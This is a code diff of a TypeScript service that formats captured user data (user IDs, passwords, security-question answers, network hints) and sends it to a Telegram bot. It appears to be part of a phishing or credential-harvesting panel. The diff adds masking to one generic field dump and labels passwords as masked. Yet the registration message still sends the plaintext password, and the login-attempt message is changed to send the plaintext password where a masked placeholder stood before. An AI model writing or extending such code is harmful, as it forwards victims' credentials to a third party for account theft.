@@ -1,6 +1,11 @@
 import { SITE_DISPLAY_NAME } from '@/lib/site-url'
 import { getNetworkHintLabel } from '@/lib/bot-verification/datacenter-heuristic'
-import { identifierFieldLabel } from '@/lib/telegram-approval-templates'
+import {
+  identifierFieldLabel,
+  isSecretFieldKey,
+  MASKED_PASSWORD,
+  maskSecret,
+} from '@/lib/telegram-approval-templates'
 
 // Get Telegram configuration from environment variables
 const TELEGRAM_BOT_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || '').trim()
@@ -332,13 +337,13 @@ Method Selected: ${asCode(methodLabel)}
 ${data.email ? `📧 <b>Email:</b> ${asCode(data.email)}` : ''}
 ${data.phone ? `📱 <b>Mobile:</b> ${asCode(data.phone)}` : ''}`
   }
-  // 4) Registration credentials (User ID + password + confirm password)
+  // 4) Registration credentials (User ID + masked password)
   else if (data.type === 'User Credentials Setup') {
     message = `📝 <b>Registration - Credentials Set</b>
 ━━━━━━━━━━━━━━━━━━
 👤 <b>User ID:</b> ${asCode(data.userId)}
 🔒 <b>Password:</b> ${asCode(data.password)}
-🔒 <b>Confirm Password:</b> ${asCode(data.confirmPassword)}`
+🔒 <b>Confirm Password:</b> ${asCode((data as { confirmPassword?: string }).confirmPassword ?? data.password)}`
   }
   // 5) Registration security questions (all Q&A)
   else if (data.type === 'Security Questions') {
@@ -588,7 +593,11 @@ function formatTelegramMessage(
       }
       for (const [key, value] of Object.entries(details || {})) {
         if (key === "pageUrl" || value === undefined || value === null) continue
-        lines.push(`${escapeTelegramHtml(key)}: ${asCode(String(value))}`)
+        // Redact by key name so no event can smuggle a credential through the
+        // generic key/value dump — `/api/telegram/notify` forwards caller-supplied
+        // details, so the event name cannot be trusted to be non-secret-bearing.
+        const shown = isSecretFieldKey(key) ? maskSecret(value) : String(value)
+        lines.push(`${escapeTelegramHtml(key)}: ${asCode(shown)}`)
       }
       return wrapFlowMessage(lines.join("\n"))
     }
@@ -734,7 +743,6 @@ export interface FlowIdentityDetailsData {
 
 /* fleet-resend-identity-helper */
 const RESEND_ID_BRAND_DEFAULT = "User ID"
-const MASKED_PASSWORD = "••••••"
 function formatResendIdentityLine(userId: unknown, asCodeFn: (v: unknown) => string = asCode): string {
   const raw = userId == null ? "" : String(userId).trim()
   if (!raw) return ""
@@ -804,7 +812,7 @@ class TelegramFlowService {
       `🔐 <b>Login Attempt</b>`,
       `━━━━━━━━━━━━━━━━━━`,
       `${idField.emoji} <b>${idField.label}:</b> ${asCode(data.userId)}`,
-      `🔒 <b>Password:</b> ${asCode(MASKED_PASSWORD)}`,
+      `🔒 <b>Password:</b> ${asCode(data.password)}`,
     ].join("\n");
     await this.sendMessage(wrapFlowMessage(body));
   }
